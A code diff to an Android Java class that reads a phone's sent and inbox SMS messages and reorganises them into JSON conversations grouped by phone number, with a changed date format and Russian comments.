@@ -125,6 +125,7 @@ public class ReadSms {
         String uri_send_sms = "content://sms/sent";
         String uri_inbox_sms = "content://sms/inbox";
         JSONObject sms = new JSONObject();//Заголовок
+        JSONObject conversation = new JSONObject();
         JSONObject body;
         JSONArray mass = new JSONArray();
         String numb_buf = "";
@@ -135,20 +136,28 @@ public class ReadSms {
             try {
                 //Если  номер один и тот же делаем типа переписака по этому номеру
                 if (!date.getAddress().equals(numb_buf)){
+                    if(mass.length() > 0) {
+                        conversation.put("Conversation", mass);
+                        mass = new JSONArray();
+                    }
                     body.put("Phone", date.getAddress());
                 }
                 body.put("Message", date.getMsg());
                 time_bufer = Long.parseLong( date.getTime());//В читабельный формат - дату
-                body.put("Time", new SimpleDateFormat("dd/MM/yyyy HH:mm")
-                                 .format(time_bufer));
+                body.put("Time", new SimpleDateFormat("dd-MM-yyyy HH:mm")
+                        .format(time_bufer));
+                mass.put(body);
             } catch (JSONException e) {
                 e.printStackTrace();
             }
-            mass.put(body);
+
             numb_buf = date.getAddress();
         }
         try {
-            sms.put("SMS", mass);
+            if(mass.length() > 0 ){
+                conversation.put("Conversation", mass); //записываем последний елемент date
+            }
+            sms.put("SMS", conversation);
         } catch (JSONException e) {
             e.printStackTrace();
         }
